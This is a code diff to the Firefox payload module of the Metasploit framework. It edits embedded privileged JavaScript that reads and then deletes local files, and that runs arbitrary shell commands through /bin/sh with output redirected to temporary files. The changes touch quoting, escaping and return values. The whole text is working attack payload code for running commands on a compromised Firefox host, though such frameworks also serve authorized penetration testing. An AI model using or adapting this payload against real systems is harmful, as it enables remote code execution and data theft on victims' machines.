@@ -3,7 +3,7 @@ require 'msf/core'
 
 module Msf::Payload::Firefox
   def read_file_source
-    %q|
+    %Q|
       var readFile = function(path) {
         try {
           var file = Components.classes["@mozilla.org/file/local;1"]
@@ -23,16 +23,17 @@ module Msf::Payload::Firefox
           fileStream.close();
           file.remove(true);
 
-          return array.map(function(aItem) { return String.fromCharCode(aItem); }).join("").trim();
-        } catch (e) { return ["",""]; }
+          return array.map(function(aItem) { return String.fromCharCode(aItem); }).join("");
+        } catch (e) { return ""; }
       };
     |
   end
 
   def run_cmd_source
-    %q|
+    %Q|
       var ua = Components.classes["@mozilla.org/network/protocol;1?name=http"]
         .getService(Components.interfaces.nsIHttpProtocolHandler).userAgent;
+      var _cmd;
       var runCmd = function(cmd) {
         var shPath = "/bin/sh";
         var shFlag = "-c";
@@ -61,7 +62,8 @@ module Msf::Payload::Firefox
                    .createInstance(Components.interfaces.nsILocalFile);
         sh.initWithPath(shPath);
 
-        var shell = shPath + " " + shFlag + " " + (cmd + " >"+stdout.path+" 2>"+stderr.path).replace(/\\W/g, shEsc);
+        var shell = shPath + " " + shFlag + " " + cmd.replace(/\\W/g, shEsc);
+        shell = shPath + " " + shFlag + " " + (shell + " >"+stdout.path+" 2>"+stderr.path).replace(/\\W/g, shEsc);
 
         var process = Components.classes["@mozilla.org/process/util;1"]
           .createInstance(Components.interfaces.nsIProcess);
